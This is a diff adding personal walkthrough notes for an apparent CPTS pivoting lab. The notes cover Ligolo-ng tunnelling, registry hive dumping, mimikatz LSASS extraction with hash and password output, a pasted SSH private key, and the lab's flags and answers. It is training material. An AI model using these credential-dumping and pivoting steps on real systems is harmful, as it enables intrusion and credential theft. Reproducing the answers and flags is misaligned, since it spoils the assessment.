@@ -14,6 +14,243 @@ On attack machine, run the Ligolo proxy:
 
 sudo ./proxy -laddr 0.0.0.0:11601 -selfcert -v
 
+
+# CPTS Skills Assessment - Full Walkthrough (Ligolo-ng Method)
+
+## Phase: Internal Enumeration & Pivot Setup
+
+### Step-by-Step (Starting from SSH into initial foothold)
+
+1. **SSH into Webadmin Box**
+   ```bash
+   ssh -i webadmin.key webadmin@10.129.229.129
+   ```
+
+2. **Transfer Ligolo-ng Agent**
+   ```bash
+   scp -i webadmin.key ./ligolo-agent webadmin@10.129.229.129:/tmp/agent
+   ```
+
+3. **On Attacker Machine: Start Ligolo Proxy**
+   ```bash
+   sudo ./proxy -laddr 0.0.0.0:11601 -selfcert -v
+   ```
+
+4. **On Target Machine: Run Ligolo Agent**
+   ```bash
+   chmod +x agent
+   ./agent -connect <attacker_ip>:11601
+   ```
+
+5. **On Attacker Machine: Inside Ligolo Shell**
+   ```bash
+   ligolo-ng
+   session
+   autoroute
+   # Select 172.16.5.0/16 or similar internal net
+   ```
+
+---
+
+## Phase: Internal RDP Access
+
+### Enumerate Internal Network
+
+Question 2 - Submit Credentials (Answer: mlefay:Plain Human work!)
+
+From previous step. Store for RDP or other future use.
+
+Question 3 - Discover Internal Host (Answer: 172.16.5.35)
+
+Start Ligolo agent on webserver via webshell:
+
+Transfer agent to /tmp  -> scp -i webadminkey agent webadmin@10.129.229.129:/tmp
+
+
+Run agent with reverse connection:
+
+./agent -connect <ATTACK_IP>:11601 -ignore-cert
+
+Back on attacker box, in Ligolo CLI:
+
+session
+select session 1
+autoroute
+Select route: 172.16.5.0/24
+Create new interface: yes
+
+Verify route added:
+
+ip route | grep ligolo
+ip addr show <ligolo_interface>
+
+Now scan internal range:
+
+proxychains nmap -sP 172.16.5.0/24
+# or use ping sweep script inside proxychains   ->>> 
+
+this didnt work. ssh again into antoehr terminal with -> ssh -i webadminkey webadmin@10.129.229.129 then run this exact ping sweep -> 
+
+for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
+64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.010 ms
+64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.412 ms
+
+---
+
+## Phase: Local Enumeration on 172.16.5.35
+
+xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:shared,/home/htb-ac-1235531/Desktop
+
+
+
+### Dump SAM, SYSTEM, SECURITY hives
+```powershell
+mkdir C:\tmp
+reg.exe save HKLM\SAM C:\tmp\sam.save
+reg.exe save HKLM\SYSTEM C:\tmp\system.save
+reg.exe save HKLM\SECURITY C:\tmp\security.save
+```
+
+### Move Files to Attacker Box
+- Use shared drive `tsclient` or Python web server
+- From Windows:
+  ```powershell
+  curl http://<attacker_ip>:8000/sam.save -o sam.save
+  # OR drag/drop into shared drive
+  ```
+
+### Dump Secrets
+```bash
+secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+```
+
+---
+
+## Phase: LSA Dump from Live System (Alternative)
+
+- task manager -> right click -> more -> run as admin -> find Local Secuirty Authority Process -> right clikc -> create dump file -> C:\Users\mlefay\AppData\Local\Temp\lsass.DMP:
+
+mimikatz -> mimikatz # sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
+
+mimikatz # sekurlsa::LogonPasswords
+
+Opening : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP' file for minidump...
+
+Output: Authentication Id : 0 ; 160843 (00000000:0002744b)
+Session           : Service from 0
+User Name         : vfrank
+Domain            : INLANEFREIGHT
+Logon Server      : ACADEMY-PIVOT-D
+Logon Time        : 11/20/2022 10:09:13 AM
+SID               : S-1-5-21-3858284412-1730064152-742000644-1103
+        msv :
+         [00000003] Primary
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
+         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
+         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
+        tspkg :
+        wdigest :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : Imply wet Unmasked!
+        ssp :
+        credman :
+
+---
+
+## Phase: Manual AD Enumeration (If SharpHound Fails)
+
+### Enumerate Interfaces
+```powershell
+ipconfig /all
+```
+- Revealed new interface: `172.16.6.35` and DNS `172.16.10.5`
+
+### Enumerate Network
+```powershell
+1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
+```
+- Identified `172.16.6.25` as new live host
+
+### RDP into `172.16.6.25`
+ -> on Mlefeay RDP session search Remote Desktop Manager -> put newley found host -> 172.16.6.25 in and use vfranks creds -> vfrank:Imply wet Unmasked!   -> log in 
+
+---
+
+## Phase: Final Flag Retrieval
+
+### From 172.16.6.25:
+- Flag in: `C:\Flag.txt`
+- Flag content: `N3tw0rk-H0pp1ng-f0R-FuN`
+
+### From Z: Drive (Mounted Share)
+- Path: `Z:\Flag.txt`
+- Flag content: `3nd-0xf-Th3-R@inbow!`
+
+---
+
+# ITTT Workflow Summary
+
+### Got This? --> Do That:
+
+- Got SSH access to initial foothold?
+  - SCP Ligolo agent, connect to proxy
+
+- Got Ligolo tunnel up?
+  - Use autoroute and check interface status
+
+- Got valid creds (e.g. `vfrank`)?
+  - Try RDP into new live IPs via `xfreerdp`
+
+- Got SYSTEM on RDP target?
+  - Dump hives using `reg.exe save`, transfer to attacker, run `secretsdump.py`
+
+- Found new NIC (e.g. 172.16.6.x)?
+  - Use PowerShell ping sweep to ID live hosts
+
+- Ping sweep inconsistent?
+  - Run again, validate manually with `Test-Connection` to each suspected host
+
+- SharpHound fails to detect domain?
+  - Fall back to manual host/IP pivoting and RDP enumeration
+
+---
+
+# Mistakes & Fixes
+
+- **Wrong HKLM path in reg.exe**:
+  - Mistyped `HLKM` instead of `HKLM`
+
+- **Used Win32 mimikatz**:
+  - Got architecture mismatch error; switched to x64 version
+
+- **Initial RDP to wrong IP**:
+  - Ended up accessing `.35` twice; missed `.25`
+
+- **No Z: drive appearing**:
+  - Confirmed only visible on the correct domain-joined box (172.16.6.25)
+
+- **First ping sweep showed False, later True**:
+  - Network conditions/timing, so always recheck if critical
+
+---
+
+# Next Step: Lessons Learned (To Be Added)
+
+
+
+
+
+
+
+
+
 Question 1 - Locate Credentials (Answer: webadmin)
 
 Add domain to /etc/hosts:
@@ -27,6 +264,53 @@ In web shell:
 cd /home/webadmin
 cat webadmin_id_rsa  # Save to your attacker machine
 cat README.txt       # Get creds mlefay:Plain Human work!
+
+
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+
+
+scp -i webadminkey agent webadmin@10.129.229.129:/tmp
+
+
 
 Question 2 - Submit Credentials (Answer: mlefay:Plain Human work!)
 
@@ -77,6 +361,83 @@ done
 Find live host at 172.16.5.35
 
 Question 4 - Pivot to 172.16.5.35 (Answer: S1ngl3-Piv07-3@sy-Day)
+
+
+🔁 Pivot to Internal Network via Ligolo-ng (No Reverse Port Forwarding Needed)
+🧱 Step 1: SCP the Agent to Internal Host (e.g., webadmin@10.129.x.x)
+bash
+Copy
+Edit
+scp -i id_rsa ./agent webadmin@10.129.229.129:/tmp
+📡 Step 2: Start Ligolo-ng Proxy on Your Host
+bash
+Copy
+Edit
+sudo ./proxy -laddr 0.0.0.0:11601 -selfcert -v
+🤖 Step 3: SSH Into Internal Host and Start the Agent
+bash
+Copy
+Edit
+ssh -i id_rsa webadmin@10.129.229.129
+cd /tmp
+chmod +x agent
+./agent -connect <YOUR-VPN-IP>:11601 -ignore-cert
+Confirm Agent joined appears in your host's Ligolo proxy terminal.
+
+🔌 Step 4: Start Ligolo-ng Session + Autoroute to Internal Subnet
+In the proxy shell:
+
+bash
+Copy
+Edit
+session
+# Choose the correct agent session
+
+autoroute
+# Select: 172.16.5.0/16
+# Create new interface when prompted (e.g., "topicalbazooka")
+✅ Step 5: Confirm Tunnel Interface is Up
+On your host machine:
+
+bash
+Copy
+Edit
+ip a | grep topicalbazooka
+You should see interface status UP.
+
+🟢 Step 6: Confirm Target Is Reachable (Optional)
+bash
+Copy
+Edit
+proxychains nmap -Pn -p 3389 172.16.5.35
+If port is open, you're good to go.
+
+🖥️ Step 7: Launch RDP Session via Proxychains
+bash
+Copy
+Edit
+ xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
+Accept the certificate prompt
+
+You should land on the Windows GUI login (as you did!)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 RDP via Ligolo (SOCKS5):
 
